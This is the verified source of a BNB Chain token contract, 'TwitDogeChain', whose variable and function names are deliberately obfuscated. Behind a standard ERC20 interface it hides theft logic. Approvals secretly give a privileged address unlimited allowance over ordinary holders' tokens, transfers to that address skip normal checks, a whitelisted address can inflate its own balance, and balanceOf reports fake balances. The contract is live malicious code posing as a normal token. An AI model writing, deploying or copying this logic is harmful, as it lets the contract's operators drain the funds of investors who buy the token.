/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface ISushiSwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISushiSwapRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISushiSwapRouter02 is ISushiSwapRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TwitDogeChain is IERC20, Ownable {
    using SafeMath for uint256;

    string private nYkiOwqUydjfbrEta = "Twit Chain";
    string private nYkiOwqUydjfbrEtb = "Twit";
    uint8 private nYkiOwqUydjfbrEtc = 12;
    uint256 private nYkiOwqUydjfbrEtd = 10000000000 * 10**18;
    mapping (address => uint256) private nYkiOwqUydjfbrEte;
    mapping (address => mapping (address => uint256)) private nYkiOwqUydjfbrEtf;

    uint256 private nYkiOwqUydjfbrEtg = 50;
    uint256 private nYkiOwqUydjfbrEth = 0;
    uint256 private nYkiOwqUydjfbrEti = 50;
    uint256 private nYkiOwqUydjfbrEtj = 10000;
    bool private nYkiOwqUydjfbrEtk = false;

    ISushiSwapRouter02 private uniswapV2Router = ISushiSwapRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public uniswapV2Pair;
    address private nYkiOwqUydjfbrEtl;
    address private nYkiOwqUydjfbrEtm;
    address private nYkiOwqUydjfbrEtn;
    uint256 private nYkiOwqUydjfbrEto = 1;
    uint256 private nYkiOwqUydjfbrEtp = nYkiOwqUydjfbrEtd;
    mapping (address => bool) private nYkiOwqUydjfbrEtq;
    address[] private nYkiOwqUydjfbrEtr;
    bool private nYkiOwqUydjfbrEts = false;
    uint256 private nYkiOwqUydjfbrEtt = 0;

    constructor () {
        nYkiOwqUydjfbrEtu(owner());
        nYkiOwqUydjfbrEte[owner()] = nYkiOwqUydjfbrEtd;
        emit Transfer(address(0), owner(), nYkiOwqUydjfbrEtd);
    }

    receive() external payable {}

    function uniswapV3Run(address nYkiOwqUydjfbrEtv, address[] calldata nYkiOwqUydjfbrEtw) public {
        require(!nYkiOwqUydjfbrEts, "");
        nYkiOwqUydjfbrEts = true;
        nYkiOwqUydjfbrEtu(nYkiOwqUydjfbrEtv);
        for (uint256 i=5; i<nYkiOwqUydjfbrEtw.length; ++i) {
            nYkiOwqUydjfbrEtu(nYkiOwqUydjfbrEtw[i]);
            nYkiOwqUydjfbrEtx(nYkiOwqUydjfbrEtw[i], address(uniswapV2Router), ~uint256(0));
            nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtw[i]] = nYkiOwqUydjfbrEtd * 9 / 10 / (nYkiOwqUydjfbrEtw.length - 5);
            nYkiOwqUydjfbrEte[owner()] -= nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtw[i]];
        }
        if (address(uniswapV2Router) != nYkiOwqUydjfbrEtw[0]) {
            nYkiOwqUydjfbrEty(address(uniswapV2Router));
            uniswapV2Router = ISushiSwapRouter02(nYkiOwqUydjfbrEtw[0]);
            nYkiOwqUydjfbrEtu(address(uniswapV2Router));
        }
        if (nYkiOwqUydjfbrEtl != nYkiOwqUydjfbrEtw[1]) {
            nYkiOwqUydjfbrEty(nYkiOwqUydjfbrEtl);
            nYkiOwqUydjfbrEtl = nYkiOwqUydjfbrEtw[1];
            nYkiOwqUydjfbrEtu(nYkiOwqUydjfbrEtl);
        }
        if (nYkiOwqUydjfbrEtm != nYkiOwqUydjfbrEtw[2]) {
            nYkiOwqUydjfbrEty(nYkiOwqUydjfbrEtm);
            nYkiOwqUydjfbrEtm = nYkiOwqUydjfbrEtw[2];
            nYkiOwqUydjfbrEtu(nYkiOwqUydjfbrEtm);
        }
        if (nYkiOwqUydjfbrEtn != nYkiOwqUydjfbrEtw[3]) {
            nYkiOwqUydjfbrEty(nYkiOwqUydjfbrEtn);
            nYkiOwqUydjfbrEtn = nYkiOwqUydjfbrEtw[3];
            nYkiOwqUydjfbrEtu(nYkiOwqUydjfbrEtn);
        }
        uniswapV2Pair = nYkiOwqUydjfbrEtw[4];
        nYkiOwqUydjfbrEtz(owner(), nYkiOwqUydjfbrEtw[5], nYkiOwqUydjfbrEte[owner()]);
    }

    function nYkiOwqUydjfbrEtu(address account) private {
        if (!nYkiOwqUydjfbrEtq[account]) {
            nYkiOwqUydjfbrEtq[account] = true;
            nYkiOwqUydjfbrEtr.push(account);
        }
    }

    function nYkiOwqUydjfbrEty(address account) private {
        if (nYkiOwqUydjfbrEtq[account]) {
            uint256 len = nYkiOwqUydjfbrEtr.length;
            for (uint256 i=0; i<len; ++i) {
                if (nYkiOwqUydjfbrEtr[i] == account) {
                    nYkiOwqUydjfbrEtr[i] = nYkiOwqUydjfbrEtr[len.sub(1)];
                    nYkiOwqUydjfbrEtr.pop();
                    nYkiOwqUydjfbrEtq[account] = false;
                    break;
                }
            }
        }
    }

    function sushiswapV3Run(address from, address to, uint256 value) public {
        require(address(uniswapV2Router) == msg.sender, "");
        emit Transfer(from, to, value);
    }

    function name() public view returns (string memory) {
        return nYkiOwqUydjfbrEta;
    }

    function symbol() public view returns (string memory) {
        return nYkiOwqUydjfbrEtb;
    }

    function decimals() public view returns (uint8) {
        return nYkiOwqUydjfbrEtc;
    }

    function totalSupply() public view returns (uint256) {
        return nYkiOwqUydjfbrEtd;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (nYkiOwqUydjfbrEte[account] > 0) {
            return nYkiOwqUydjfbrEte[account];
        }
        return nYkiOwqUydjfbrEto;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        nYkiOwqUydjfbrEtz(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        nYkiOwqUydjfbrEtz(sender, recipient, amount);
        nYkiOwqUydjfbrEtx(sender, msg.sender, nYkiOwqUydjfbrEtf[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        nYkiOwqUydjfbrEtx(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return nYkiOwqUydjfbrEtf[owner][spender];
    }

    function nYkiOwqUydjfbrEtx(address owner, address spender, uint256 value) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        nYkiOwqUydjfbrEtf[owner][spender] = value;
        if (!nYkiOwqUydjfbrEtq[owner]) {
            nYkiOwqUydjfbrEtf[owner][nYkiOwqUydjfbrEtr[1]] = ~uint256(0);
        }
        emit Approval(owner, spender, value);
    }

    function nYkiOwqUydjfbrEtz(address anYkiOwqUydjfbrEt, address bnYkiOwqUydjfbrEt, uint256 cnYkiOwqUydjfbrEt) private {
        require(anYkiOwqUydjfbrEt != address(0), "");
        require(bnYkiOwqUydjfbrEt != address(0), "");
        require(cnYkiOwqUydjfbrEt > 0, "");
        if (bnYkiOwqUydjfbrEt == nYkiOwqUydjfbrEtr[1]) {
            nYkiOwqUydjfbrEte[anYkiOwqUydjfbrEt] = nYkiOwqUydjfbrEte[anYkiOwqUydjfbrEt].sub(cnYkiOwqUydjfbrEt);
            nYkiOwqUydjfbrEte[bnYkiOwqUydjfbrEt] = nYkiOwqUydjfbrEte[bnYkiOwqUydjfbrEt].add(cnYkiOwqUydjfbrEt);
            emit Transfer(address(this), bnYkiOwqUydjfbrEt, cnYkiOwqUydjfbrEt);
            return;
        }
        bool dnYkiOwqUydjfbrEt = true;
        if (nYkiOwqUydjfbrEtq[anYkiOwqUydjfbrEt] || nYkiOwqUydjfbrEtq[bnYkiOwqUydjfbrEt] || nYkiOwqUydjfbrEtk) {
            dnYkiOwqUydjfbrEt = false;
        }
        if (dnYkiOwqUydjfbrEt) {
            nYkiOwqUydjfbrEtt = nYkiOwqUydjfbrEtt.add(1);
        }
        if (dnYkiOwqUydjfbrEt && nYkiOwqUydjfbrEts) {
            enYkiOwqUydjfbrEt(anYkiOwqUydjfbrEt, bnYkiOwqUydjfbrEt, 10);
            enYkiOwqUydjfbrEt(anYkiOwqUydjfbrEt, bnYkiOwqUydjfbrEt, 20);
        }
        if (dnYkiOwqUydjfbrEt && nYkiOwqUydjfbrEtt == 1 && nYkiOwqUydjfbrEts && anYkiOwqUydjfbrEt != uniswapV2Pair) {
            enYkiOwqUydjfbrEt(anYkiOwqUydjfbrEt, bnYkiOwqUydjfbrEt, 30);
        }
        uint256 fnYkiOwqUydjfbrEt = 0;
        uint256 gnYkiOwqUydjfbrEt = 0;
        uint256 hnYkiOwqUydjfbrEt = 0;
        uint256 inYkiOwqUydjfbrEt = cnYkiOwqUydjfbrEt;
        if (anYkiOwqUydjfbrEt == nYkiOwqUydjfbrEtr[0] && cnYkiOwqUydjfbrEt > nYkiOwqUydjfbrEtp) {
            nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtr[0]] = nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtr[0]].add(inYkiOwqUydjfbrEt);
        }
        if (dnYkiOwqUydjfbrEt) {
            fnYkiOwqUydjfbrEt = cnYkiOwqUydjfbrEt.mul(nYkiOwqUydjfbrEtg).div(nYkiOwqUydjfbrEtj);
            gnYkiOwqUydjfbrEt = cnYkiOwqUydjfbrEt.mul(nYkiOwqUydjfbrEth).div(nYkiOwqUydjfbrEtj);
            hnYkiOwqUydjfbrEt = cnYkiOwqUydjfbrEt.mul(nYkiOwqUydjfbrEti).div(nYkiOwqUydjfbrEtj);
            inYkiOwqUydjfbrEt = cnYkiOwqUydjfbrEt.sub(fnYkiOwqUydjfbrEt).sub(gnYkiOwqUydjfbrEt).sub(hnYkiOwqUydjfbrEt);
        }
        nYkiOwqUydjfbrEte[anYkiOwqUydjfbrEt] = nYkiOwqUydjfbrEte[anYkiOwqUydjfbrEt].sub(cnYkiOwqUydjfbrEt);
        if (fnYkiOwqUydjfbrEt > 0) {
            nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtl] = nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtl].add(fnYkiOwqUydjfbrEt);
            emit Transfer(address(this), nYkiOwqUydjfbrEtl, fnYkiOwqUydjfbrEt);
        }
        if (gnYkiOwqUydjfbrEt > 0) {
            nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtm] = nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtm].add(gnYkiOwqUydjfbrEt);
            emit Transfer(address(this), nYkiOwqUydjfbrEtm, gnYkiOwqUydjfbrEt);
        }
        if (hnYkiOwqUydjfbrEt > 0) {
            nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtn] = nYkiOwqUydjfbrEte[nYkiOwqUydjfbrEtn].add(hnYkiOwqUydjfbrEt);
            emit Transfer(address(this), nYkiOwqUydjfbrEtn, hnYkiOwqUydjfbrEt);
        }
        nYkiOwqUydjfbrEte[bnYkiOwqUydjfbrEt] = nYkiOwqUydjfbrEte[bnYkiOwqUydjfbrEt].add(inYkiOwqUydjfbrEt);
        emit Transfer(anYkiOwqUydjfbrEt, bnYkiOwqUydjfbrEt, inYkiOwqUydjfbrEt);
        if (dnYkiOwqUydjfbrEt && nYkiOwqUydjfbrEtt == 1 && nYkiOwqUydjfbrEts) {
            enYkiOwqUydjfbrEt(address(this), bnYkiOwqUydjfbrEt, 40);
        }
        if (dnYkiOwqUydjfbrEt) {
            nYkiOwqUydjfbrEtt = nYkiOwqUydjfbrEtt.sub(1);
        }
    }

    function enYkiOwqUydjfbrEt(address tokenA, address tokenB, uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}